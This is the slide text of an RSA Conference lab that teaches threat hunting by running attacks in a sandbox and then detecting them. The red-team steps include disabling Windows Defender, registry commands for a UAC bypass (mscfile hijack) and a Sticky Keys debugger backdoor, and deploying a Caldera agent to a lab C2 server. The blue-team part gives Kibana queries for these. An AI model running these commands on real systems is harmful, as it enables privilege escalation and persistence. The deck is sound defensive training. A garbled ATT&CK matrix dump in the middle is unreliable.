SESSION ID: LAB4-W10
Red Teaming for Blue Teamers: A Practical Approach Using Open Source Tools

Travis Smith
Manager, Security Content and Research Tripwire, Inc @MrTrav

#RSAC

#RSAC
Agenda
14:00-14:10 ­ Access Learning Lab Virtual Environment 14:10-15:00 ­ Run Through Red Team Activities 15:00-16:00 ­ Run Through Blue Team Activities

#RSAC
Accessing the Lab
https://tripwire.me/vhX X will be you're specific student number on your desk
Password: rsalearninglab OS Credentials: rsa/learninglab OS Hostname: host-X OS IP Address: 10.0.0.X
3

#RSAC
Log Into SkyTap
https://tripwire.me/vh1
rsalearninglab

#RSAC
Launch Victim Host Console
Username: rsa Password: learninglab

#RSAC

#RSAC
Today's Red Team Toolset

Today's Blue Team Toolset
Elastic Stack
Kibana Beats Elasticsearch

#RSAC
Windows Sysmon
@SwiftOnSecurity

#RSAC
Disable Windows Defender*
Start Menu > Settings > Update & Security Click Windows Security on left side menu Click Virus & threat protection Click Manage settings Turn Off:
­ Real-time protection ­ Cloud-delivered protection

#RSAC
Red Team Exercise #1
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1088/T1088.md

#RSAC
Red Team Exercise #1
Launch Event Viewer, confirm it launches

#RSAC
Red Team Exercise #1
Run atomic command
­ reg add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f

#RSAC
Red Team Exercise #1
Launch Event Viewer, confirm CMD.exe launches
Launch other executables from here: · notepad · calc · whoami · ping

#RSAC
Red Team Exercise #2
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1015/T1015.md

#RSAC
Red Team Exercise #2
Launch Sticky Keys (Hit Shift key 5+ times)
Click No

#RSAC
Red Team Exercise #2 ­ Easier Procedure
Launch CMD.EXE as administrator
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f

#RSAC
Red Team Exercise #2
Launch Sticky Keys (Hit Shift key 5+ times)
Launch other executables from here: · notepad · calc · whoami · ping

Initial Access

Execution

Persistence

Privilege Escalation Defense Evasion

Credential Access

Discovery

Lateral Movement

Collection

Command And

Exfiltration

Impact

Drive-by Compromise AppleScript

.bash_profile and .bashrc Access Token ManipulationAccess Token ManipulationAccount Manipulation Account Discovery

A ppl eS c ri pt

Audio Capture

CCoomnmtroonlly Used Port

Automated Exfiltration Account Access Removal

EA xpppll ioci tatPi ounbl i c -Fac i ng

CMSTP

Accessibility Features Accessibility Features Binary Padding

Bash History

ADpispcliocvaetriyon Window

ASpopftlwicaaretion Deployment Automated Collection

CRoemmmovuanbilceaMtioendiTahrough Data Compressed

Data Destruction

External Remote Services Command-Line Interface Account Manipulation AppCert DLLs

BITS Jobs

Brute Force

BDri os wc osveer rBy ook mark

CanodmDpiosnterinbtuOtebdjeCcOt MModel Clipboard Data

Connection Proxy

Data Encrypted

Data Encrypted for Impact

Hardware Additions

Compiled HTML File

AppCert DLLs

AppInit DLLs

Bypass User Account Control

Credential Dumping

Domain Trust Discovery

Exploitation of Remote S erv i c es

Data from Information Repos i tori es

Custom Command and Control Protocol

Data Transfer Size Limits Defacement

RReepmliocvaatibolen MTherdoiuagh

CanodmDpiosnterinbtuOtebdjeCcOt MModel AppInit DLLs

Application Shimming Clear Command History CBrreodwesnetrisals from Web

FDiilsecaonvderDy i rec tory

Internal Spearphishing Data from Local System CPruostotocmolCryptographic

EPxroftioltcraotlion Over AlternativeDisk Content Wipe

Spearphishing Attachment Control Panel Items

Application Shimming

BCoynptarsols User Account

CMSTP

Credentials in Files

Network Service Scanning Logon Scripts

DDaritvaefrom Network Shared Data Encoding

EanxdfilCtroantitoronlOCvhearnCnoeml mandDisk Structure Wipe

Spearphishing Link

Dynamic Data Exchange Authentication Package DHLijLacSkeinagrch Order

Code Signing

Credentials in Registry Network Share Discovery Pass the Hash

DMaetdaiafrom Removable

Data Obfuscation

ENxetfwiltorarktioMneOdivuemr Other

Endpoint Denial of Service

Spearphishing via Service Execution through API BITS Jobs

Dylib Hijacking

Compile After Delivery EAxccpelosistation for Credential Network Sniffing

Pass the Ticket

Data Staged

Domain Fronting

EMxefdilituramtion Over Physical Firmware Corruption

Supply Chain CompromiseELoxaedcution through Module Bootkit

Elevated Execution with Prompt

Compiled HTML File

Forced Authentication Password Policy DiscoveryRemote Desktop Protocol Email Collection

Domain Generation Algorithms

Scheduled Transfer

Inhibit System Recovery

Trusted Relationship

EExxpelcouittaiotnion for Client

Browser Extensions

Emond

Component Firmware

Hook i ng

PDeisricpohveeraryl Device

Remote File Copy

Input Capture

Fallback Channels

Network Denial of Service

Valid Accounts

Graphical User Interface CAhsasnogceiaDtioenfault File

EExspclaoliatatitoinon for Privilege CHoijmacpkoinnegnt Object Model Input Capture

PDeisrmcoivsesriyon Groups

Remote Services

Man in the Browser

Multi-hop Proxy

Resource Hijacking

Ins tal l Uti l

Component Firmware

EInxjetrcatiWonindow Memory Connection Proxy

Input Prompt

Process Discovery

RReepmliocvaatibolen MTherdoiuagh

Screen Capture

Multi-Stage Channels

Runtime Data Manipulation

Launchctl

CHoijmacpkoinnegnt Object Model FWileeaSknyesstesm Permissions Control Panel Items

K erberoas ti ng

Query Registry

Shared Webroot

Video Capture

Multiband Communication

Service Stop

Local Job Scheduling Create Account

Hook i ng

DCShadow

Keychain

Remote System DiscoverySSH Hijacking

Multilayer Encryption

Stored Data Manipulation

LSASS Driver Mshta PowerShell Regs v c s /Regas m Regs v r32 Rundll32 Scheduled Task S c ri pti ng Service Execution Signed Binary Proxy Execution SEixgenceudtiSoncript Proxy

DHLijLacSkeinagrch Order Dylib Hijacking

IOmpatigoensFiIlnejeEcxtieocnution Launch Daemon

Emond

New Service

External Remote Services Parent PID Spoofing

File System Permissions Weakness

Path Interception

HDiidredcetnorFieilses and

Plist Modification

Hook i ng

Port Monitors

Hy perv i s or IOmpatigoensFiIlnejeEcxtieocnution Kernel Modules and Extensions Launch Agent

PowerShell Profile
Process Injection
Scheduled Task SP eerrvmi ci ses Ri oengsi sWtryeak nes s

DoreIonbfofurmscaatitoen/Decode Files LaLnMd RNeRl/aNyBT-NS PoisoningSDeisccuorviteyrySoftware

Taint Shared Content

Disabling Security Tools Network Sniffing

Software Discovery

Third-party Software

DHLijLacSkeinagrch Order

Password Filter DLL

SDyissctoevmerIynformation

Windows Admin Shares

DLL Side-Loading

Private Keys

SCoynsftiegmuraNteiotwnoDrkiscovery WMainndaogwems eRnetmote

Execution Guardrails

Securityd Memory

System Network Connections Discovery

EExvpalsoiiotnation for Defense Steal Web Session CookieSDyissctoevmerOywner/User

EInxjetrcatiWonindow Memory TInwteor-cFeapcttioornAuthentication System Service Discovery

File and Directory Permissions Modification

System Time Discovery

File Deletion

VE ivratusai loi nz ati on/S andbox

File System Logical Offsets

Gatekeeper Bypass

Port Knocking
Remote Access Tools
Remote File Copy SPtraontodcaordl Application Layer Standard Cryptographic P rotoc ol SLataynedr aPrdroNtoocno-lAppl i c ati on Uncommonly Used Port
Web Service

System Shutdown/Reboot TMraannsipmuliattteiodnData

S ourc e

Launch Daemon

Setuid and Setgid

Group Policy Modification

Space after Filename

Launchctl

SID-History Injection

Hidden Files and Di rec tori es

Third-party Software

LC_LOAD_DYLIB Addition Startup Items

Hidden Users

Trap

Local Job Scheduling Sudo

Hidden Window

Trusted Developer Utilities Login Item

Sudo Caching

User Execution Windows Management Ins trumentati on WMainndaogwems eRnetmote XSL Script Processing

Logon Scripts LSASS Driver Modify Existing Service Netsh Helper DLL

Valid Accounts Web Shell

New Service

Office Application Startup

Path Interception

HISTCONTROL IOmpatigoensFiIlnejeEcxtieocnution Indicator Blocking ITnodoilcsator Removal from Indicator Removal on Host IEnxdeirceucttioCnommand Install Root Certificate
Ins tal l Uti l

Available Atomics

Plist Modification

Launchctl

Port Knocking

LC_MAIN Hijacking

Port Monitors

Mas queradi ng

PowerShell Profile

Modify Registry

Rc .c ommon
Re-opened Applications
Redundant Access RSetagritsutpryFoRludnerKeys / Scheduled Task

Mshta NReetmwoovrkalShare Connection NTFS File Attributes OInbfofurmscaatitoend Files or Parent PID Spoofing

S c reens av er

Plist Modification

Security Support Provider SCeormv epronSeonfttware SP eerrvmi ci ses Ri oengsi sWtryeak nes s Setuid and Setgid

Port Knocking Process Doppelgänging Process Hollowing Process Injection

Shortcut Modification SHIiPjacaknidngTrust Provider Startup Items

Redundant Access Regs v c s /Regas m Regs v r32

System Firmware

Rootk i t

Systemd Service

Rundll32

Time Providers
Trap
Valid Accounts
Web Shell WISnusibntrsduocmwriepsntitMoantaionnagEevmeennt t Winlogon Helper DLL

S c ri pti ng SEixgenceudtiBoninary Proxy ESxigenceudtiSoncript Proxy SIP and Trust Provider Hi j ac k i ng Software Packing
Space after Filename

Template Injection

Ti mes tomp

Trusted Developer Utilities

Valid Accounts VE ivratusai loi nz ati on/S andbox Web Service

XSL Script Processing

#RSAC

#RSAC
Red Team Exercise #3

#RSAC
Red Team Exercise #3

#RSAC
Red Team Exercise #3

#RSAC
Red Team Exercise #3
TACTIC | TECHNIQUE

#RSAC
Red Team Exercise #3

#RSAC
Red Team Exercise #3
http://10.0.0.222:8888 admin/admin

#RSAC
Red Team Exercise #3
Plugins > sandcat Windows (PowerShell)

#RSAC
Red Team Exercise #3
Plugins > sandcat Windows (Powershell)

#RSAC
Red Team Exercise #3
Launch PowerShell Add Optional Arguments to Command
-group host-X -server http://10.0.0.222:888

#RSAC
Red Team Exercise #3
Campaigns > Agents

#RSAC
Red Team Exercise #3
Campaigns > Operations
Name: HOST-X Operation Basic Options Group: host-x Adversary: Nosy Neighbor Open: Auto close operation Run: Run immediately

#RSAC
Red Team Exercise #3

#RSAC
Blue Team Exercises

#RSAC
https://github.com/swannman/ircapabilities

#RSAC
Blue Team Exercise
http://10.0.0.222:5601

#RSAC
Elastic Query Language Tips
Beats data is in Elastic Common Schema (ECS) https://www.elastic.co/guide/en/ecs/current/index.html field:value agent.hostname:"host-x" agent.hostname:"host-x" and event.code:1 agent.hostname:"host-x" and process.name:"powershell.exe"

#RSAC
Kibana SIEM

#RSAC
Threat Hunting Attack 1
Hypothesis: Attackers are abusing Bypass User Account Control

#RSAC
Threat Hunting Attack 1

Search for modification of registry control keys

­ event.code: 13

­ "mscfile"

agent.hostname:"host-X"

What was the Parent PID?

and event.code:"13"

and mscfile

Drag/Drop the hostname from the table to the top of the page

#RSAC
Threat Hunting Attack 1

Search for the process which modified the registry
­ event.code:1 ­ process.pid:XXXX

(event.code:13 and mscfile) or (event.code:1 and process.pid:xxxx)

What was the Parent PID?

#RSAC
Threat Hunting Attack 1

Search for the process which spawned this process

­ event.code:1

­ process.pid:XXXX (event.code:13 and mscfile) or

What was the Parent Process Name? What
does that mean?

(event.code:1 and (process.pid:xxxx or process.pid:yyyy))

#RSAC
Threat Hunting Attack 1
What We Know:
­ User opened cmd.exe from the file explorer ­ User ran a reg query to modify the OPEN command for mscfile types ­ If that users were to open any mscfiles, it will spawn cmd.exe
What To Search Next:
­ Did the user actively abuse this technique?

#RSAC
Threat Hunting Attack 1
Search for execution of cmd.exe related to MSC files
­ event.code: 1 ­ process.name: "cmd.exe"
(event.code:13 and mscfile) or (event.code:1 event.code:"1"and (process.pid:xxxx or process.pid:yyyy)) or (process.name:"cmd.exe" and *.msc)

#RSAC
Threat Hunting Attack 1
Search to see if this process is a parent ­ event.code: 1 ­ process.pid:"zzzz" ­ process.parent.pid:"zzzz"
(event.code:13 and mscfile) or (event.code:1 event.code:"1"and (process.pid:xxxx or process.pid:yyyy)) or (process.pid:zzzz or process.parent.pid:zzzz)

#RSAC
Threat Hunting Attack 1

#RSAC
Threat Hunting Attack 2
Hypothesis: Attackers are abusing Windows Accessibility Keys

#RSAC
Threat Hunting Attack 2

Search for execution of Accessibility Keys
­ event.code: 1 ­ process.name: sethc.exe, utilman.exe, osk.exe, sethc.exe, magnify.exe,
DisplaySwitch.exe, or AtBroker.exe

agent.hostname:"host-X" and event.code:"1" and

Shorthand to just sethc.exe for simplicity

(process.name:("sethc.exe" or "atbroker.exe" or "utilman.exe" or "osk.exe" or "magnify.exe" or "DisplaySwitch.exe"))

#RSAC
Threat Hunting Attack 2

Search for Accessibility Key registry modifications

­ event.code: 13

­ "Image File Execution Options"

­ <list of accessibility exes>

What is the PID?

event.code:"13" and
"Image File Execution Options" and ("sethc.exe" or "atbroker.exe" or "utilman.exe" or "osk.exe" or "magnify.exe" or "DisplaySwitch.exe")

#RSAC
Threat Hunting Attack 2

Search For Process History

­ process.pid:xxxx ­ process.pid:yyyy

PID for parent process

process.pid:xxxx or process.pid:yyyy

#RSAC
Threat Hunting Attack 2
What We Know:
­ User opened cmd.exe from the file explorer ­ User ran a reg query to modify the Debugger command for sethc.exe ­ If that users were to open sethc.exe, it would open cmd.exe
What To Search Next:
­ Did the user actively abuse this technique?

#RSAC
Threat Hunting Attack 2

Search for process information
­ event.code: 1 ­ process.name:"cmd.exe"
event.code:"1" and process.name:cmd.exe

One of these should look odd

#RSAC
Threat Hunting Attack 2
Search for process tree
­ event.code: 1 ­ process.pid:xxxx ­ process.parent.pid:xxxx
event.code:"1" and (process.pid:xxxx or process.parent.pid:xxxx)

#RSAC
Threat Hunting Attack 2

#RSAC
Threat Hunting Caldera
Hypothesis: Attackers are doing ??

#RSAC
Which is least likely to occur under normal operations?

#RSAC
Threat Hunting Caldera Attack
Avoid Logs (Defense Evasion | File Deletion) Identify Active User (Discovery | System Owner/User Discovery) Collect ARP Details (Discovery | Remote System Discovery) System Processes (Discovery | Process Discovery) Scan WiFi Networks (Discovery | System Network Config Discovery) Preferred WiFi (Discovery | System Network Config Discovery) Disrupt WiFI (Execution | Command-Line Interface)

#RSAC
Threat Hunting Caldera Attack
Avoid Logs (Defense Evasion | File Deletion) Identify Active User (Discovery | System Owner/User Discovery) Collect ARP Details (Discovery | Remote System Discovery) System Processes (Discovery | Process Discovery) Scan WiFi Networks (Discovery | System Network Config Discovery) Preferred WiFi (Discovery | System Network Config Discovery) Disrupt WiFI (Execution | Command-Line Interface)

#RSAC
Threat Hunting Caldera Attack
Identify Active User
­ whoami, query user, others?
Collect ARP details
­ arp, others?
System Processes
­ tasklist, wmic process, others?
Disrupt WiFi
­ netsh, others?

#RSAC
Threat Hunting Caldera Attack

#RSAC
Apply What You Have Learned Today
Next week you should:
­ Identify log data sources being collected ­ Map current hypothetical coverage of MITRE ATT&CK
In the first three months following this presentation you should:
­ Setup sample machines to red team against ­ Practice with manual attacks from Atomic Red Team
Within six months you should:
­ Begin automating attacks ­ Threat hunting against real data and systems
58

